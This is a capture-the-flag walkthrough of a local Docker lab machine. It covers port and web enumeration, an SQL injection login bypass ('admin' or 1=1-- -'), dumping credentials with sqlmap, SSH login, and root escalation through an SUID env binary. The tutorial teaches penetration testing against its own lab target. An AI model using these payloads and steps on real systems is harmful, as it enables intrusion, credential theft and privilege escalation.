# Injection. Docker Labs.

## Deployment
Start de vulnerable machine ```bash auto_deploy.sh injection.tar``` and check connectivity.

![Image](https://github.com/user-attachments/assets/d0a83f2e-3f96-4993-9558-654a63dfdac5)

## Enumeration

Once connected lets check if there are any ports open. Nmap is a scanning tool.

```nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG scanfile```

- -p- : Scan all ports
- --open: Chech just the open ports
- --min-rate 5000: Send packets faster (faster scanning)
- -sS: Sync Scan. Fast and silent scan.
- -sV: Version of the service runnning in the port.
- -vvv: Increase verbosity (more information)
- -n: No DNS resolution (faster scanning)
- -Pn: Ignores if the ip is active or not
- Export result to a file:
   -oG: Exports the result in a grepable format (to extract more easily the data with tools such as grep, awk)
   -oN: Export the result to the designated file.

![imagen](https://github.com/user-attachments/assets/fed91e29-a35b-442a-9ba0-730c934afcf2)

Ports 22 and 80 are open. Let's get more info about them.

```nmap -sCV -p22,80 172.17.0.2```
- -sCV: Script scanning and version scanning combined

![imagen](https://github.com/user-attachments/assets/a5e0136f-602c-4ea0-9d4c-8f0a9b0725e8)

Once we've stablished the open ports, let's check the common vulnerabilities:

    Port 22 Vulnerabilities (SSH)
    
    Port 22 is commonly used for Secure Shell connections. It is preferred over Telnet because the connection is encrypted. Often used for remote management, Port 22 is a TCP port for ensuring secure remote access. Despite its enhanced security, it still suffers from some basic vulnerabilities:
    
        Leaked SSH keys. If SSH keys are not correctly secured, they can be accessed by an attacker to gain entry without having the required password.
        Brute-forcing Credentials. Open SSH ports are easily discoverable, allowing attackers to guess username and password combinations.


    Ports 80, 443, 8080, and 8443 Vulnerabilities (HTTP and HTTPS)
    
    Anyone who has visited a web page has used the HTTP or HTTPS protocols in their web browser. As mentioned, web ports are commonly targeted by attackers for many types of attacks, including:
    
        Cross-site scripting. Attackers inject malicious scripts into web pages and applications to steal cookies, tokens, or data.
        SQL injections. Attackers insert malicious SQL code into input fields to manipulate a database.
        Cross-site request forgers. An attacker exploits the trust between a user’s web browser and a web application to trick the user into performing actions on a website without their knowledge or consent.
        DDoS attacks
  
In this case, OpenSSH 9.x is quite secure, so the vulnerability to exploit is probably through the use of port 80.

  
### Web enumeration

Enumeration of port 80 is usually known as web enumeration. To perform this kind of enumeration tools which carry out 
tasks known as fuzzing are used. Fuzzing is a methodology that consists of sending random or modified data to a web
application with the aim of provoking errors or discovering vulnerabilities. Further explanation in the Trust.md file.

First let browse the ip and then let's use Gobuster. 

![imagen](https://github.com/user-attachments/assets/57f6451f-e816-4c81-88ab-98601b8441ce)

We obtain an interesting result; a login page. We'll come back to it later. 

Before using Gobuster, we are going to use the tool ```whatweb```. We launch whatweb to check the tecnologies running in 
the web server.

```whatweb 172.17.0.2``` or ```whatweb http://172.17.0.2```

![imagen](https://github.com/user-attachments/assets/0d49641e-f166-40e1-878f-392f1cf2a680)

We can see that the login we found is enumerated among the different technologies. Let's run the fuzzing tool ```gobuster```.

```gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt -t 20 -x html,php,txt,php.bak```

- dir: For directory and file enumerating
- -u: Target URL specification.
- -w /usr/share/wordlists/dirb/common.txt: Select word dictionary located in this address.
- -x html,php,txt,php.bak: Common file formats.

The config.php page is blank and the index.php is the same login page we encountered before. 
Whenever you find yourself in a login page you can try different common usernames and passwords to test the water.
Some common examples are:
- Username: admin, user ...
- Password: admin, password ...

If we don't get a satisfying result, we can try other methods. This login pages sometimes are vulnerable to
SQL sentences or inyections. One way to check this, is using a random SQL sentence or even just a ```'``` in
one of the fields to see the result. We tried it and ...

![imagen](https://github.com/user-attachments/assets/bff48243-f86f-41be-bf37-45b8018af5d3)

Bingo. We have found the vulnerability we can exploit.

## Exploiting: SQL Injection

SQL (Structured Query Language) is a language that allows us to interact with databases. Modern web applications use 
databases to manage data and display dynamic content to readers.
SQL injection (or SQLi) occurs when a user attempts to insert malicious SQL statements into a web application. If 
successful, they will be able to access sensitive data in the database.
An SQL injection vulnerability gives an attacker full access to your application's database by using malicious SQL statements.

If there is nothing to prevent a user from entering "wrong" input, the user can enter some "smart" input like this:

    UserId: admin' or 1=1-- -
    Password: any password

Then, the SQL statement will look like this:

    SELECT * FROM Users WHERE UserId =  admin OR 1=1;

The SQL above is valid and will return ALL rows from the "Users" table, since OR 1=1 is always TRUE. This way we can 
bypass the login.

![imagen](https://github.com/user-attachments/assets/dc983822-1184-46f6-b52b-01b4a6cc7703)

Trying this method we obtain the username and the password. (Not common but we won't complain).

Other method of sql injection can be ```sqlmap```.

### SQL Injection: sqlmap

Sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

```sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch```

- -u: -u URL, --url=URL   Target URL. (e.g. "http://www.site.com/vuln.php?id=1")
- --forms: Parse and test forms on target URL. Parameter(s) for testing in the provided data.
- --dbs: Enumerate DBMS databases. (As seen in the next image)
- --batch: Never ask for user input, use the default behavior. (Automatic Y/N response to the questions)

![imagen](https://github.com/user-attachments/assets/75d8ce95-4508-4cfe-aec5-cd11a500a25e)

As we have encountered a login page, our target here seems to be the ```register database```. Let's check it.

```sqlmap -u http://172.17.0.2/index.php --forms -D register --tables --batch```

- -D DB: DBMS database to enumerate.
- --tables: Enumerate DBMS database tables.

![imagen](https://github.com/user-attachments/assets/7b4cb887-b38b-4cbc-a2c9-cb144ed18614)

We found one table inside the register DB and looks promising as it is called ```users```.

```sqlmap -u http://172.17.0.2/index.php --forms -D register -T users --columns --batch```

- -T TBL: DBMS database table(s) to enumerate.
- --columns: Enumerate DBMS database table columns.

![imagen](https://github.com/user-attachments/assets/6faae46e-07fa-4b16-bed8-eac0cbafa3c1)

We are so close. Just one more step and we will obtain the username and password listed in the DB.

```sqlmap -u http://172.17.0.2/index.php --forms -D register -T users -C passwd,username --dump --batch```

- -C COL: DBMS database table column(s) to enumerate
- --dump: Dump DBMS database table entries

![imagen](https://github.com/user-attachments/assets/39b77686-546d-4fad-8c03-b04c8cc55154)

We got it! And the information has been stored in a .csv so we can access it later on.
(For example, in this case ```cat /home/kali/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv ```)
Let's try to access via ssh. (Remember port 22 was open)

![imagen](https://github.com/user-attachments/assets/37ba6292-0214-4a58-b461-9f0c596284b9)

###  Privilege Escalation

As Dylan, we don't have many privileges. This means we cannot access most of the information. We need to find a way to become root. Firstly, we can check which permits does ```sudo``` have. None. Let's try other method: suid permits.

![imagen](https://github.com/user-attachments/assets/b68b9926-4d29-4365-8d4a-a2dbc1a01605)

Once we have stablished the permits suid has, let look up in [GTFOBins](https://gtfobins.github.io/) how we can exploit those permits. Let's try with ```env``` for example

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

```./env /bin/sh -p```

![imagen](https://github.com/user-attachments/assets/36bb87b4-0a3c-4949-b3d7-443b0364ca58)

We are root!
